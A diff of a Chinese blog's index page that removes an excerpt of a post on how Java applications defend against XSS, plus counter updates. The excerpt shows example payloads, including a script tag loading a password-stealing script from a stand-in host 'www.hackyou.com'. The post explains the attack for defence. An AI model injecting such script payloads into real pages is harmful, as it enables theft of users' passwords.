-<p>翻jdk的同时还发现另一种拆分时间的方法，但是没有<code>Calendar</code>自由。<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/05/28/java-get-time/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="https://amosannn.github.io/2017/05/27/xss/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Amosannn">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/16012509?v=3&u=6fe0dd08943216aeff2d3c9d1b8c3e602f6de8e9&s=400">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Amosannn">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/05/27/xss/" itemprop="url">Java如何防范XSS攻击</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-27T22:45:01+08:00">
-                2017-05-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/技术一路走到黑/" itemprop="url" rel="index">
-                    <span itemprop="name">技术一路走到黑</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/05/27/xss/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/05/27/xss/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>XSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。</p>
-<p>XSS是一种经常出现在web应用中的计算机安全漏洞…多的就不说了，<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC" target="_blank" rel="noopener">wiki</a>里写的很清楚。</p>
-<h1 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h1><p>我来讲讲我接触到的XSS攻击，容易发生事故的地方就在评论区或问卷提交、注册等等涉及到文本提交操作的步骤中。如果你像我一样是一个勤勤恳恳牢记社会主义核心价值观的少先队员，一定会按问题提示或页面提示输入自然语言。而如果是动了歪脑筋的坏人，他可能会输入这样的信息来恶搞你。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"未满十八岁不得浏览该网站"</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>你可能觉得这没什么，但如果他是个超级坏人，提交的不是这种简单的弹窗脚本，而是这样呢？<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"www.hackyou.com/getallpassword.js"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>惊不惊喜？<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/05/27/xss/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1836,7 +1780,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-count">28</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -1858,7 +1802,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">28</span>
+                <span class="site-state-item-count">30</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
